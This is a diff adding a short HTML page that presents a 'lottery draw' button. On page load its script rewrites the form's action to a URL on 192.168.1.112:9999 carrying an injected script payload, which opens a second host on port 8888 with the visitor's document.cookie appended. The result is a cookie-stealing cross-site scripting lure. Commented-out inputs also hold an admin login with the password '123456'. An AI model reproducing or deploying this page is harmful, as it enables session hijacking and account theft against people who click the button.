@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form action method="get">
+        <!-- <input type="text" name="user" value="admin"> -->
+        <!-- <input type="password" name="password" value="123456"> -->
+        <input type="button" onclick="submit()" value="begion choujiang">
+    </form>
+    <script>
+        function submit() {
+            console.log('登录')
+        }
+        window.onload = function () {
+            var action = "http://192.168.1.112:9999/?id=<script>window.open('http://192.168.1.112:8888/cookie?cookie=" + document.cookie + "')</script>"
+            console.log(document.getElementsByTagName('form')[0])
+            document.getElementsByTagName('form')[0].action = action
+        }
+    </script>
+</body>
+</html>
